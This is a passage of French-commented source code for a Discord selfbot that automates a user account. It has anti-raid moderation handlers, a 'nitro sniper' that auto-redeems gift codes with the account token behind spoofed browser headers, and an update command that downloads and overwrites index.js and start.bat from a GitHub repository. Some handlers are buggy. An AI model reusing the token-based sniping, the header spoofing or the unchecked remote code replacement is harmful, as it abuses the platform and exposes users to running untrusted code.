    crowsecur["antikick"] = "on"
    savesecur()
    message.edit("L'anti kick a été activé")
  }
  else{
    crowsecur["antikick"] = "off"
    savesecur()
    message.edit("L'anti kick a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antiupdate")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antiupdate on`**")
  if (args[0] === "on"){
    if (crowsecur["antiupdate"] === "on") return message.edit(":x: **L'anti update est déjà activé**")
    crowsecur["antiupdate"] = "on"
    savesecur()
    message.edit("L'anti update a été activé")
  }
  else{
    crowsecur["antiupdate"] = "off"
    savesecur()
    message.edit("L'anti update a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antiping")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antiping on`**")
  if (args[0] === "on"){
    if (crowsecur["antiping"] === "on") return message.edit(":x: **L'anti ping est déjà activé**")
    crowsecur["antiping"] = "on"
    savesecur()
    message.edit("L'anti ping a été activé")
  }
  else{
    crowsecur["antiping"] = "off"
    savesecur()
    message.edit("L'anti ping a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antilien")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antilien on`**")
  if (args[0] === "on"){
    if (crowsecur["antilien"] === "on") return message.edit(":x: **L'anti lien est déjà activé**")
    crowsecur["antilien"] = "on"
    savesecur()
    message.edit("L'anti lien a été activé")
  }
  else{
    crowsecur["antilien"] = "off"
    savesecur()
    message.edit("L'anti lien a été désactivé")
  }
}










// Divers
if (message.content.startsWith(prefix + "typing")){
  message.delete().catch(() => false)
  let channel = client.channels.cache.get(message.channel.id)
if (args[0] === "on"){
  channel.sendTyping()
}
else if (args[0] === "off"){
  channel.send("✔ **Tu n'écrit plus**")
}
}


if (message.content.startsWith(prefix + "edited")){
  let text = args.slice(0).join(' ') || "sltcv"
  message.delete().catch(() => false).then(() => {
    message.channel.send("** **").then(() =>{
      message.edit(text)
    })
  })
}

















if (message.content.startsWith(prefix + "update")){
  snekfetch.get('https://api.npoint.io/a98dafe0fd0029dcdc74').then(r => {
    let vers = r.body.version
  if (vers === ver) return message.edit("**Aucune mise à jour de disponnible**")
  else{
message.edit("mise à jour en cours...");
UpdateFile("index.js", "https://raw.githubusercontent.com/002-sans/Evolution/main/index.js");
UpdateFile("start.bat", "https://raw.githubusercontent.com/002-sans/Evolution/main/start.bat");
message.edit("Mise à jour terminer vous pouvez relancer le selfbot.");
  }
}).catch(() => message.edit("Je n'ai pas pu me connecter à l'api.. Refait la commande").catch(() => false))
}
















})

client.on('ready', () =>{
  if (rpc === "on"){
  if (!titre && !ligne1 && !ligne2 && !rpcimage) return;
  const r = new RichPresence()
	.setApplicationId('1006729051702038628')
	.setType('PLAYING')
	.setURL('https://discord.gg/eTgaDja53E')
	if (ligne2) r.setState(ligne2)
	if (titre) r.setName(titre)
	if (ligne1) r.setDetails(ligne1)
	if (rpcimage) r.setAssetsLargeImage(rpcimage)
	if (boutontexte && boutonurl) r.addButton(boutontexte, boutonurl)
  if (boutontexte2 && boutonurl2) r.addButton(boutontexte2, boutonurl2)
  if (timestamp === "on") r.setStartTimestamp(Date.now())
  client.user.setActivity(r.toJSON());
  }
})

client.on('guildDelete', guild => {
  console.log(" ")
  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(consolecolor.atlas("[EVENT] Tu as quitté " + guild.name))
  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(" ")
})

client.on('guildCreate', guild => {
  console.log(" ")
  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(consolecolor.atlas("[EVENT] Tu as rejoint " + guild.name))
  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(" ")
})

client.on('rateLimit', (info) => {
  console.log(`[!] Rate limit pendant ${info.timeDifference ? info.timeDifference : info.timeout ? info.timeout: 'Temps inconnu '} ms`)
})










// Crow


client.on('roleCreate', async(role) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antirole"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const guild = role.guild
  let roleguild = role.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_CREATE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antirole`).catch(() => false)
   )
  }
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antirole`).catch(() => false)
 )
  }

  role.delete(`Antirole`)

}
})

client.on('roleDelete', async(oldRole, newRole) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antirole"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')

const guild = oldRole.guild
  let roleguild = oldRole.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_DELETE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antirole`)
   )
  }
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antirole`)
 )
  }

  try {
    oldRole.guild.roles.create({
        name: oldRole.setName(oldRole.name),
        color: oldRole.setColor(oldRole.hexColor),
        permissions: oldRole.setPermissions(oldRole.permissions),
        hoist: oldRole.setHoist(oldRole.hoist),
        mentionable: oldRole.setMentionable(oldRole.mentionable),
        position: oldRole.setPosition(oldRole.rawPosition),
        reason: `Antirole`

    })
  } catch (err) {

  }
}
})

client.on('roleUpdate', async(oldRole, newRole) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antirole"] === "off") return;
  if (oldRole === newRole) return
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const guild = newRole.guild

  let roleguild = newRole.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antirole`)
   )
  }
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antirole`)
 )
  }

  try {
    await oldRole.edit({
      data: {
        name: oldRole.setName(oldRole.name),
        color: oldRole.setColor(oldRole.hexColor),
        permissions: oldRole.setPermissions(oldRole.permissions),
        hoist: oldRole.setHoist(oldRole.hoist),
        mentionable: oldRole.setMentionable(oldRole.mentionable),
        position: oldRole.setPosition(oldRole.rawPosition),
        reason: `Protection: ${this.name}`
      }
    })
  } catch (err) {

  }


}
})

client.on('channelCreate', async(channel) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antichannel"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const guild = channel.guild

  let roleguild = channel.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_CREATE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antichannel`)
)}
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antichannel`))
  }

  channel.delete(`Antichannel`)


}
})

client.on('guildMemberUpdate', async (oldMember, newMember) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antirole"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const securguild = crow["guild"]
  let crowguild = securguild
  if (!crowguild) return;

  const guild = oldMember.guild


  let oldRoleIDs = [];
  oldMember.roles.cache.forEach(role => {
      oldRoleIDs.push(role.id);
  });
  let newRoleIDs = [];
  newMember.roles.cache.forEach(role => {
      newRoleIDs.push(role.id);
  });

      //check if the newRoleIDs had one more role, which means it added a new role
if (newRoleIDs.length > oldRoleIDs.length) {
function filterOutOld(id) {
   for (var i = 0; i < oldRoleIDs.length; i++) {
       if (id === oldRoleIDs[i]) {
           return false;
       }
   }
   return true;
}
let onlyRole = newRoleIDs.filter(filterOutOld);
let IDNum = onlyRole[0];
}

  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
    if (crow["guilds"].includes(guild.id)){
  const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
  if (!action) return;
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
    await guild.members.fetch(action.executor.id).then((member) => {
    member.roles.set([], `antirole`).catch(() => member.kick(`antirole`).catch(() => false))

    })
    newMember.roles.remove(IDNum, `Anti rôle`).catch(() => false)
  }
})

client.on('channelDelete', async(channel) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antichannel"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const securguild = crow["guild"]
  let guild = securguild
  if (!guild) return;

  let roleguild = channel.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_DELETE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antichannel`))
  }
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antichannel`))
  }

  try {
    await channel.clone({
      name: channel.name,
      permissions: channel.permissionsOverwrites,
      type: channel.type,
      topic: channel.withTopic,
      nsfw: channel.nsfw,
      birate: channel.bitrate,
      userLimit: channel.userLimit,
      rateLimitPerUser: channel.rateLimitPerUser,
      permissions: channel.withPermissions,
      position: channel.rawPosition,
      reason: `Antichannel`
    })
  } catch (error) {
    return;
  }
}
})

client.on('channelUpdate', async(oldChannel, newChannel) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antichannel"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  const guild = oldChannel.guild

  let roleguild = oldChannel.guild
  if (!roleguild) return;
  if (crow["guilds"].includes(roleguild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_UPDATE" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antichannel`))
  }
  else{
 await guild.members.fetch(action.executor.id).then((member) => 
 member.roles.set([], `Antichannel`))
  }
  try {
    newChannel.edit({
      name: oldChannel.setName(oldChannel.name),
      permissions: oldChannel.permissionOverwrites,
      type: oldChannel.setType(oldChannel.type),
      topic: oldChannel.setTopic(oldChannel.topic),
      nsfw: oldChannel.setNSFW(oldChannel.nsfw),
      bitrate: oldChannel.setBitrate(oldChannel.bitrate),
      userLimi: oldChannel.setUserLimit(oldChannel.userLimit),
      rateLlimitPerUser: oldChannel.setRateLimitPerUser(oldChannel.rateLimitPerUser),
      position: oldChannel.setPosition(oldChannel.rawPosition),
      reason: `Antichannel`
    })

  } catch (err) { }
}
})

client.on('guildBanAdd', async(user) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antiban"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  let guild = user.guild
  if (!guild) return;
  if (crow["guilds"].includes(guild.id)){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_BAN_ADD" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.bot){
   await guild.members.fetch(action.executor.id).then((member) => 
   member.kick(`Antiban`))
  }
  else{
  await guild.members.fetch(action.executor.id).then((member) => 
  member.roles.set([], `Antiban`))
  }

  guild.members.unban(user, `Antiban`)

}
})

client.on('guildMemberAdd', async(member) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antibot"] === "off") return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  if (!roleguild) return;
  let guild = member.guild
  if (!guild) return;
  if (crow[guild.id]){
  if (!guild.me.permissions.has("ADMINISTRATOR")) return;
  const action = await guild.fetchAuditLogs({ limit: 1, type: "BOT_ADD" }).then(async (audit) => audit.entries.first());
  if (action.executor.id === client.user.id) return;
  if (crowd["users"].includes(action.executor.id)) return;
  if (action.executor.id){
    await guild.members.fetch(action.executor.id).then((member) => 
    member.roles.set([], `Antiban`)    )
    guild.members.kick(member, `antibot`)

  }
  }
})

client.on("guildUpdate", async (oldGuild, newGuild) => {
  const crowsecur = require('./Data/crowsecur.json')
  if (crowsecur["antiupdate"] === "off") return;
  if (oldGuild === newGuild) return;
  const crow = require('./Data/crowguild.json')
  const crowd = require('./Data/crow.json')
  let guild = oldGuild
  if (!guild) return;

  let roleguild = oldGuild
  if (!roleguild) return
  if (crow["guilds"].includes(roleguild.id)){
    if (!guild.me.permissions.has("ADMINISTRATOR")) return
    const action = await guild.fetchAuditLogs({ limit: 1, type: "GUILD_UPDATE" }).then(async (audit) => audit.entries.first());
    if (action.executor.id === client.user.id) return;
    if (crowd["users"].includes(action.executor.id)) return;
    if (action.executor.bot){
      await guild.members.fetch(action.executor.id).then((member) => 
      member.kick(`Antiupdate`))
    }
    else{
   await guild.members.fetch(action.executor.id).then((member) => 
   member.roles.set([], `Antiupdate`)
)}

    if (oldGuild.name === newGuild.name) {

    } else {
      await newGuild.setName(oldGuild.name)

    }
    if (oldGuild.iconURL({ dynamic: true }) === newGuild.iconURL({ dynamic: true })) {

    } else {
      await newGuild.setIcon(oldGuild.iconURL({ dynamic: true }))

    }
    if (oldGuild.bannerURL() === newGuild.bannerURL()
    ) {

    } else {
      await newGuild.setBanner(oldGuild.bannerURL())

    }
    if (oldGuild.position === newGuild.position
    ) {

    } else {
      await newGuild.setChannelPositions([{ channel: oldGuild.id, position: oldGuild.position }])

    }

    if (oldGuild.systemChannel === newGuild.systemChannel
    ) {

    } else {
      await newGuild.setSystemChannel(oldGuild.systemChannel)

    }
    if (oldGuild.systemChannelFlags === newGuild.systemChannelFlags
    ) {

    } else {
      await newGuild.setSystemChannelFlags(oldGuild.systemChannelFlags)


    }
    if (oldGuild.verificationLevel === newGuild.verificationLevel
    ) {

    } else {
      await newGuild.setVerificationLevel(oldGuild.verificationLevel)


    }
    if (oldGuild.widget === newGuild.widget
    ) {

    } else {
      await newGuild.setWidget(oldGuild.widget)


    }
    if (oldGuild.splashURL === newGuild.splashURL
    ) {

    } else {
      await newGuild.setSplash(oldGuild.splashURL)


    }
    if (oldGuild.rulesChannel === newGuild.rulesChannel
    ) {

    } else {
      await newGuild.setRulesChannel(oldGuild.rulesChannel)


    }
    if (oldGuild.publicUpdatesChannel === newGuild.publicUpdatesChannel
    ) {

    } else {
      await newGuild.setPublicUpdatesChannel(oldGuild.publicUpdatesChannel)


    }
    if (oldGuild.defaultMessageNotifications === newGuild.defaultMessageNotifications
    ) {

    } else {
      await newGuild.setDefaultMessageNotifications(oldGuild.defaultMessageNotifications)


    }
    if (oldGuild.afkChannel === newGuild.afkChannel
    ) {

    } else {
      await newGuild.setAFKChannel(oldGuild.afkChannel)


    }
    if (oldGuild.region === newGuild.region
    ) {

    } else {
      await newGuild.setRegion(oldGuild.region)


    }

    if (oldGuild.afkTimeout === newGuild.afkTimeout
    ) {

    } else {
      await newGuild.setAFKTimeout(oldGuild.afkTimeout)

    }
    if (oldGuild.vanityURLCode === newGuild.vanityURLCode
    ) {
      const settings = {
        url: `https://discord.com/api/v6/guilds/${guild.id}/vanity-url`,
        body: {
          code: oldGuild.vanityURLCode
        },
        json: true,
        method: 'PATCH',
        headers: {
          "Authorization": `Bot ${process.env.token}`
        }
      };
      await request(settings, (err, res, body) => {
        if (err) {
          return;
        }
      });
    }
  }

})

client.on('guildMemberAdd', async(member) => {
  const guild = member.guild
  if (!guild) return;
  const bl = require('./Data/bl.json')
if (bl["users"].includes(member.id)){
  guild.members.fetch(member.id).then((member) => 
  member.ban().catch(() => false))
  }
  })

  client.on('messageCreate', async(message) => {
    const member = message.author
    const guild = message.guild
    if (!guild) return;
    const bl = require('./Data/bl.json')
  if (bl[member.id]){
    guild.members.fetch(member.id).then((member) => 
    member.ban().catch(() => false))
    }
    })

    client.on('messageCreate', async (message) => {
      const crowsecur = require('./Data/crowsecur.json')
      if (crowsecur["antilink"] === "off") return;
      const crowguild = require('./Data/crowguild.json')
      const crowuser = require('./Data/crow.json')
      const guild = message.guild
      if (!message.guild) return;
    if (crowguild["guilds"].includes(message.guild.id)){
      if (crowuser["users"].includes(message.author.id)) return;
      if (botcertified.includes(message.author.id)) return;
      if (message.content.includes("discord.gg/")){
        if (message.author.bot){
          await guild.members.fetch(message.author.id).then((member) => 
          member.kick(`Antilink`))
        }
        else{
          await guild.members.fetch(message.author.id).then((member) => 
       member.roles.set([], `Antilink`).then(() => member.timeout(60000).catch(() => false)
       )
    )}
      }
    }
    })

    client.on('webhookUpdate', async (TextChannel, NewsChannel, VoiceChannel) => {
      let yo = TextChannel || NewsChannel || VoiceChannel
      const guild = TextChannel.guild || NewsChannel.guild || VoiceChannel.guild
      const crowsecur = require('./Data/crowsecur.json')
      if (crowsecur["antiwebhook"] === "off") return;
      const crowguild = require('./Data/crowguild.json')
      const crowuser = require('./Data/crow.json')
    if (crowguild["guilds"].includes(yo.guild.id)){
  
      if (!guild.me.permissions.has("ADMINISTRATOR")) return;
      const action = await guild.fetchAuditLogs({ limit: 1, type: "WEBHOOK_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      if (crowuser["users"].includes(action.executor.id)) return;
      if (action.executor.bot){
        await guild.members.fetch(action.executor.id).then((member) => {
        member.kick(`antiwebhook`)   
        })
      }
    else{
      await guild.members.fetch(action.executor.id).then((member) => {
      member.roles.set([], `antiwebhook`)
     }
   )}
  
  if (TextChannel) TextChannel.fetchWebhooks().then((webhooks) => {
    webhooks.forEach((wh) => wh.delete());
    })
  
  if (NewsChannel) NewsChannel.fetchWebhooks().then((webhooks) => {
      webhooks.forEach((wh) => wh.delete());
      })
  
    if (VoiceChannel) VoiceChannel.fetchWebhooks().then((webhooks) => {
        webhooks.forEach((wh) => wh.delete());
        })
  
  
      }
    })

    client.on('messageCreate', async (message) => {
      const crowsecur = require('./Data/crowsecur.json')
      if (crowsecur["antiping"] === "off") return;
      const crow = require('./Data/crowguild.json')
      const crowuser = require('./Data/crow.json')
      const securguild = crow["guilds"]
      let guild = securguild
      if (!message.guild) return;
      if (!guild) return;
      if (crow["guilds"].includes(message.guild.id)){
        if (crowuser["users"].includes(message.author.id)) return;
        if (message.content.includes("@everyone")){
                  if (message.webhookId){
      await message.channel.fetchWebhooks().then(web => web.forEach(w => {
        return w.delete().catch(() => false) && message.delete().catch(() => false)
      })
      )
    }
    else{
          message.delete().catch(() => false)
          if (message.author.bot){
            await message.guild.members.fetch(message.author.id).then((member) => 
            member.kick(`Antiping`))
          }
          else{
            await message.guild.members.fetch(message.author.id).then((member) => 
         member.roles.set([], `Antiping`)
      )}       
     }
    }
        if (message.content.includes("@here")){
          message.delete().catch(() => false)
          if (message.webhookId){
            await message.channel.fetchWebhooks().then(web => web.forEach(w => {
              return w.delete().catch(() => false) && message.delete().catch(() => false)
            })
            )
          }
          else{
          if (message.author.bot){
            await guild.members.fetch(message.author.id).then((member) => 
            member.kick(`Antiping`))
          }
          else{
            await guild.members.fetch(message.author.id).then((member) => 
         member.roles.set([], `Antiping`)
      )}  
        }
      }
    }
    })


    function matchCode(text, callback) {
      let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
      if (codes) {
          callback(codes[0])
          return matchCode(text.slice(codes.index + codes[0].length), callback)
      } else {
          callback(null)
      }
  }
  
  client.on("messageCreate", message => {
      let codes = []
      matchCode(message.content, (code) => {
          if (!code) return
          if (!codes.includes(code)) codes.push(code)
      })
      if (codes.length == 0) return
      codes.forEach(code => {
          fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
              method: "post",
              headers: {
                  "Accept": "*/*",
                  "Accept-Encoding": "gzip, deflate, br",
                  "Accept-Language": "en-US",
                  "Authorization": client.token,
                  "Connection": "keep-alive",
                  "Content-Length": JSON.stringify({
                      channel_id: message.channel.id
                  }).length,
                  "Content-Type": "application/json",
                  "Host": "canary.discordapp.com",
                  "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                  "X-super-properties": Buffer.from(JSON.stringify({
                      "os": "Windows",
                      "browser": "Firefox",
                      "device": "",
                      "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                      "browser_version": "66.0",
                      "os_version": "10",
                      "referrer": "",
                      "referring_domain": "",
                      "referrer_current": "",
                      "referring_domain_current": "",
                      "release_channel": "canary",
                      "client_build_number": 37519,
                      "client_event_source": null
                  }), "utf-8").toString("base64")
              },
              body: JSON.stringify({
                  channel_id: message.channel.id
              })
          }).then(res => {
              if (res.status == 400 || res.status == 404) return console.log(`code invalide :  ${code}`.red)
              res.json().then(json => {
                  console.log(json)
                  console.log(" ")
                  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
                  console.log(consolecolor.atlas("[EVENT] A nitro has probably been added to your credits"))
                  console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
                  console.log(" ")
              })
          }).catch(console.error)
      })
  })

  
client.on('messageCreate', async(message) => {
  const afk = require("./Data/afk.json")
  if (message.author.id === client.user.id) return;
  if (message.content.includes(client.user.id)) {
    if (message.author.id === client.user.id) return;
    if (afk[client.user.id]) {
        message.reply(":x: Je suis afk pour la raison: `" + afk[client.user.id].r + "`");
        console.log(" ")
        console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        console.log(consolecolor.atlas("[EVENT] le membre "+message.author.username + " t'as ping lors de ton afk"))
        console.log(consolecolor.atlas("[EVENT] Message: " + message.content))
        console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        console.log(" ")
    } else return;

}

else if (message.channel.type === "DM"){
  if (afk[client.user.id]) {
    message.reply(":x: Je suis afk pour la raison `" + afk[client.user.id].r + "`");
    console.log(" ")
    console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    console.log(consolecolor.atlas("[EVENT] l'utilisateur "+message.author.username + " t'as envoyé un mp lors de ton afk"))
    console.log(consolecolor.atlas("[EVENT] Message: " + message.content))
    console.log(consolecolor.fruit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    console.log(" ")
} else return;
}
})


client.on('messageCreate', async(message) => {
  let copy = require('./Data/copy.json')
  
  if (message.channel.id === copy[message.channel.id]){
    if (message.author.id === copy[message.author.id]){
      message.channel.send(message.content)
    }
  }
})



}).catch(() => {
  console.log(consolecolor.instagram("[-] Liaison entre l'api et le selfbot non effectuée..."))
  console.log(consolecolor.instagram("[-] Veuillez relancer le selfbot..."))

  setTimeout(() => {
    process.exit(1)
  }, 700);
})

process.on("unhandledRejection", (error) => {
console.log(error)
    setTimeout(() => {
  }, 500);
})
process.on("uncaughtException", (error) => {
console.log(error)
    setTimeout(() => {
  }, 500);
})
process.on("exit", () => {
console.log(consolecolor.cristal("[EVENT] Fermeture du selfbot..."))
})

